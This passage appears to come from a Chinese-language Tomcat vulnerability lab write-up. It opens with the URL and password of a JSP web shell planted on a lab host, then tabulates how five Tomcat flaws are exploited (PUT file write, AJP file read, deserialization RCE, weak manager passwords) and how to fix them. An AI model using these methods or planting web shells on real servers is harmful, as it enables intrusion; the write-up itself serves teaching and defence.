- **URL**：`http://192.168.197.88:8080/shell/shell.jsp`
- **密码**：`pass`

测试连接，成功即可管理文件、执行命令。

![](images/Pasted%20image%2020261012125011.png)


## 三、漏洞原理总结

| 漏洞编号 | 漏洞类型 | 注入点 | 利用方式 |
|---------|---------|--------|---------|
| CVE-2017-12615 | 任意文件写入 | PUT 方法 + DefaultServlet | 利用 `/` 后缀绕过检测写入 JSP |
| CVE-2020-1938 | 文件包含/读取 | AJP 协议 8009 端口 | 通过 AJP 读取 webapp 任意文件 |
| CVE-2025-24813 | 反序列化 RCE | 部分 PUT + Session 持久化 | 写入序列化对象 + 操作 JSESSIONID |
| CVE-2026-34486 | 反序列化 RCE | Tribes 4000 端口 | 绕过 EncryptInterceptor 发送 payload |
| 弱口令 | 后台管理 | manager 后台 | 弱口令登录后上传 war 包 |

**核心本质**：Tomcat 的漏洞利用通常需要特定的错误配置作为前提——`readonly=false`、Session 持久化开启、Tribes 集群启用、弱口令等。这提醒我们，**生产环境中应严格遵循安全配置基线**，关闭不必要的功能和端口。

## 四、修复方案

| 漏洞 | 修复版本 | 临时措施 |
|------|---------|---------|
| CVE-2017-12615 | Tomcat 8.5.20+ | 确保 DefaultServlet 的 `readonly=true` |
| CVE-2020-1938 | Tomcat 9.0.31 / 8.5.51 / 7.0.100+ | 关闭 AJP 连接器或配置 `secret` 认证 |
| CVE-2025-24813 | Tomcat 9.0.98 / 10.1.35 / 11.0.3+ | 关闭 Session 持久化或设置 `readonly=true` |
| CVE-2026-34486 | 升级到官方修复版本 | 关闭 Tribes 集群或限制 4000 端口访问 |
| 弱口令 | 无版本修复 | 移除默认用户、使用强密码、限制 manager 访问 IP |

**通用建议**：

1. 及时升级 Tomcat 到最新安全版本
2. 将 DefaultServlet 的 `readonly` 设置为 `true`（默认值）
3. 如非必要，关闭 AJP 连接器；如必须使用，配置 `secret` 和 `address` 限制
4. 生产环境禁用 Session 持久化，或将其存储在安全路径
5. 限制 Tribes 接收端口的网络访问，仅允许集群内节点通信
6. 移除 `tomcat-users.xml` 中的默认用户，使用强密码，并限制 manager 页面的访问 IP
7. 部署 WAF，拦截包含 `PUT` 方法、异常 `Content-Range` 头、`JSESSIONID=.xxx` 等特征的恶意请求